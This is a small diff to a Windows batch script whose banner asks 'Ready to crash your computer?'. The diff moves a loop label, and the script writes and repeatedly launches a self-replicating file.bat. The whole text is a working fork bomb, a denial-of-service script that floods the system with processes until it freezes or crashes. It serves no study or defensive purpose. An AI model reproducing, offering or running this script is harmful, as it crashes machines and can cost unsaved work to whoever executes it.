@@ -1,6 +1,6 @@
 @echo off
-:loop
 echo Ready to crash your computer?
+:loop
 pause
 
 echo :loop > file.bat && echo start file.bat >> file.bat && echo start file.bat >> file.bat &&echo start file.bat >> file.bat &&echo start file.bat >> file.bat && echo start file.bat >> file.bat &&echo start file.bat >> file.bat && echo goto loop >> file.bat
